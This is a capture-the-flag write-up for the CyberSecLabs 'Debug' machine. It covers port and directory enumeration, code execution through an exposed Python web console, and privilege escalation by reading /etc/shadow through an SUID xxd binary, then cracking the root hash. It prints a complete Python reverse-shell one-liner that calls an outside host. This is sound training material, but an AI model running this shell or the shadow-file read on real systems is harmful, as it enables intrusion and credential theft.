---
layout: page
title: Debug - CyberSecLabs
permalink: /posts/ctf/cyberseclabs/debug.html
---

# Debug - CyberSecLabs
----



First things first, lets run our nmap scan.  I use a custom script that scans for ports then passes those open ports to nmap for service enumeration, however you can achieve the same results with the below command.

`nmap -p- -A 172.31.1.3`

![image](https://user-images.githubusercontent.com/50459517/109021751-cb156300-7680-11eb-90a4-873c885cfa6f.png)

Looks like we only have 2 ports open, lets check out the web site on port 80

![image](https://user-images.githubusercontent.com/50459517/109021814-d8cae880-7680-11eb-9c6f-08bb45af8d35.png)

Seems like we have just a basic web site here, lets enumerate for directories with **dirsearch**

![image](https://user-images.githubusercontent.com/50459517/109021881-e84a3180-7680-11eb-8f33-18056eb700fb.png)

A couple of these such as /contact and /blog can be seen from the main page, however /console looks interesting.  Lets go there and see what we got.

![image](https://user-images.githubusercontent.com/50459517/109021930-f5672080-7680-11eb-8aa9-371eb8d6d09c.png)

Looks like we have an interactive console on the website that we can execute python code on.  I tried a simple **print("hello world")** which worked successfully.  I then executed the following to test and see if we was executing code straight from the server and make sure this wasn't some kind of rabbit hole.

![image](https://user-images.githubusercontent.com/50459517/109021975-0021b580-7681-11eb-875f-7c211ffc4659.png)

This looks good.  Since we are executing python code from the server, we can execute a python reverse shell one liner like the following to get a reverse shell..

`import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`

If we start a netcat listener on out machine and execute this, we get a shell as the user **megan**

![image](https://user-images.githubusercontent.com/50459517/109022222-3eb77000-7681-11eb-957a-26b53cd72042.png)

Now lets copy **LinPEAS** to the machine and see what we can find.

![image](https://user-images.githubusercontent.com/50459517/109022265-48d96e80-7681-11eb-8f49-b708062b16ea.png)

We see an interesting SUID binary that we may be able to abuse.  Lets look at **GTFOBins** and see what we can find.

![image](https://user-images.githubusercontent.com/50459517/109022317-52fb6d00-7681-11eb-93aa-84098690185d.png)

Looks like we may be able to abuse xxd to read files we don't have permission too.  Lets see if we can read the contents of **/etc/shadow**

![image](https://user-images.githubusercontent.com/50459517/109022368-5ee72f00-7681-11eb-8cf7-fdb06499cf3d.png)

It worked!  Lets copy the root hash and run it through john to see if we can crack it.

![image](https://user-images.githubusercontent.com/50459517/109022423-6a3a5a80-7681-11eb-84a2-37ac87a760e0.png)

Looks like we have a password!  Now we can login and have full root access to the machine!

![image](https://user-images.githubusercontent.com/50459517/109022462-732b2c00-7681-11eb-95db-806ca283ee01.png)
